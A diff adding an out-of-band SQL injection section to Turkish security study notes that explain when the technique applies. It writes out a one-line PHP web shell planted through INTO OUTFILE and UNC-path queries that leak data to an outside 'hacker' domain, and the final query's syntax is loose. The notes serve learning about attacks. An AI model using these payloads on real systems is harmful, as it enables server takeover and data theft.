@@ -235,7 +235,51 @@
 * Biz yukarıdaki kodu yazdığımızda, o kodun veritabanına gitmesi ve tekrar bize geri gelmesi arasında bir süre geçiyor. Eğer aradığımız karakter(a) veritabanında bulunuyorsa sleep(5) fonksiyonu devreye girecek ve konsolda çıktı olarak geçen süreye eklenecektir. Dolayısıyla eğer yukarıdaki şart doğruysa 5 ten büyük değerde bir süre geçmiş olacaktır. Ve bunu gördüğümüzde aradığımız karakterin veritabanında olduğunu doğrulamış olacağız. 
 
 
-## Out-of-Band SQLi
+## Out-of-Band SQLi(Sınır Dışı SQLi)
+
+* sözlük
+    * samba: Yazılım paketi. Linux ve Windows sistemleri arasında dosya paylaşımını sağlar.
+
+OOB SQLi verinin DNS ya da HTTP gibi dış kanallardan sızması durumunda ortaya çıkar.
+
+### OOB SQLi Ne Zaman Aranır
+
+* Web uygulaması sql sonuçlarını response olarak vermediğinde,
+* Error based ve time based sqli methodları engellendiğinde ya da yavaş çalıştığında.
+* Veritabanı dış iletişim fonksiyonlarını destekliyorsa.
+
+Örn,
+
+```jsx
+id = request.get('id')
+
+rabbitmq.pushTask('report_generate',id)
+
+print("selam")
+```
+
+Yukarıdaki kodda web uygulaması bizden aldığı verileri **RabbitMQ** adında bir servise gönderdi. Burada sleep() gibi sql fonksiyonları işlemiyor çünkü artık sql bu uygulamada yok. Dışarıdan bir servise yollandı veriler. 
+
+INTO OUTFILE diske veri yazar. 
+
+```sql
+SELECT '<?=system(@$_GET['cmd']);?>' INTO OUTFILE 'var/www/html/c99.php';
+```
+
+Bu aşamada samba bağlanır. Sambanın çalışabilmesi için domain'i çözmesi gerekir. Biz de bu aşamada subdomain'e(alt domain ya da küçük domain) bir şeyler yazabiliriz;
+
+```sql
+SELECT 'can' INTO OUTFILE '\\\hacker.can.com/a';
+```
+
+Artık sql sorgusu çalıştırmak mümkün oluyor;
+
+```sql
+SELECT 'can' INTO OUTFILE '\\\'+(SELECT 'can')+'.can.com/a';
+```
+
+
+
 
 # KAYNAK
 [Web Security 101 0x01 | SQL Injection’ı Bütünüyle Anlamak](https://www.youtube.com/watch?v=WtHnT73NaaQ) 
